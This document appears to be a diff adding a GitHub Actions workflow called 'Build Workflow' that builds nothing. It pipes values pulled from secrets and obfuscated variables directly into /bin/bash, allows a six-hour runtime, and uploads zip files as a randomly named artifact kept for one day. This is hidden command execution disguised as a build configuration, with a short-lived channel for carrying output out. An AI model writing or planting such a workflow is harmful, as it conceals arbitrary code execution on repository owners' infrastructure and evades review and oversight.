@@ -1,0 +1,25 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          tlk546: ${{ secrets.tlk546 }}
+        run: |
+          printf '%s' "$tlk546" | jq -r .mtn48 | /bin/bash
+          printf '%s' "$yhvej4985" | jq -r .atbfy394 | /bin/bash
+          echo $lf145 | jq -r .tgge3115 | /bin/bash
+          echo $g140 | jq -r .khiga2 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0ePPEzBm
+          path: "*.zip"
+          retention-days: 1
